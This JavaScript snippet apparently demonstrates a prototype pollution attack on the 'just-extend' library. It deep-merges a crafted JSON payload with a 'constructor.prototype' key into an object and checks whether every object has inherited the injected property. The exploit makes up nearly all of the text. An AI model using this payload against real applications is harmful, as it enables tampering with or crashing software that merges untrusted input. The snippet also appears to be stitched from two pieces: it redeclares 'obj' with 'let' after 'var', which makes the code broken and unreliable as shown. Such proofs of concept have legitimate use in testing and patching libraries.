var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const extend = require('just-extend');
let obj = {};
console.log({}.polluted);
let payload2 = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
extend(true, obj, payload2);
console.log({}.polluted);